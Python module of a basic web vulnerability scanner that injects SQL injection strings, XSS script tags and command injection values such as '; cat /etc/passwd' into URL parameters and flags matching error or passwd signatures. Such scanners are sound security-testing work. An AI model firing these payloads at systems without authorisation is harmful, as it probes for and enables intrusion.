import requests

# -------------------------------
# SQL Injection
# -------------------------------
SQLI_PAYLOADS = [
    "' OR '1'='1",
    "\" OR \"1\"=\"1",
    "'; --",
    "' OR 1=1 --",
]
SQLI_ERROR_SIGNATURES = [
    "SQL syntax", "mysql_fetch", "syntax error",
    "Warning: mysql", "Unclosed quotation mark",
    "You have an error in your SQL syntax;"
]

def check_sqli(url, params, method='get', session=None):
    if session is None:
        session = requests

    found_sqli = False
    for payload in SQLI_PAYLOADS:
        test_params = {k: payload for k in params}
        if method == 'post':
            r = session.post(url, data=test_params)
        else:
            r = session.get(url, params=test_params)

        # Check for known SQL error messages
        for sig in SQLI_ERROR_SIGNATURES:
            if sig.lower() in r.text.lower():
                print(f"[!] Possible SQL Injection at {url} with payload '{payload}'")
                found_sqli = True
                break
        if found_sqli:
            break
    return found_sqli

# -------------------------------
# Cross-Site Scripting (XSS)
# -------------------------------
XSS_PAYLOAD = "<script>alert('XSS')</script>"

def check_xss(url, params, method='get', session=None):
    if session is None:
        session = requests

    test_params = {k: XSS_PAYLOAD for k in params}

    if method == 'post':
        r = session.post(url, data=test_params)
    else:
        r = session.get(url, params=test_params)

    # If we see our exact payload in the response, it's likely a reflection
    if XSS_PAYLOAD in r.text:
        print(f"[!] Possible XSS at {url} with payload '{XSS_PAYLOAD}'")
        return True
    return False

# -------------------------------
# Command Injection
# -------------------------------
CMD_INJECTION_PAYLOADS = [
    "; ls",
    "&& ls",
    "| ls",
    "; cat /etc/passwd",
    "&& cat /etc/passwd",
]

CMD_INJECTION_SIGNATURES = [
    "root:x:0:0",      # typical in /etc/passwd
    "daemon:",         # also in /etc/passwd
    "bin/bash",
    "Windows IP Configuration",  # if we tried windows commands
]

def check_cmd_injection(url, params, method='get', session=None):
    if session is None:
        session = requests

    found_cmd = False

    for payload in CMD_INJECTION_PAYLOADS:
        test_params = {k: payload for k in params}

        if method == 'post':
            resp = session.post(url, data=test_params)
        else:
            resp = session.get(url, params=test_params)

        for sig in CMD_INJECTION_SIGNATURES:
            if sig.lower() in resp.text.lower():
                print(f"[!] Possible Command Injection at {url} with payload '{payload}'")
                found_cmd = True
                break
        if found_cmd:
            break

    return found_cmd

# -------------------------------
# Stored XSS
# -------------------------------

def check_stored_xss(url, param_key="comment", session=None):
    if session is None:
        session = requests.Session()

    payload = "<script>alert('Stored XSS')</script>"
    # Post the payload to the URL
    session.post(url, data={param_key: payload})

    # Re-fetch the page to see if the payload is reflected
    r = session.get(url)
    if payload in r.text:
        print(f"[!] Possible Stored XSS at {url} (payload found after submission)")
        return True
    return False

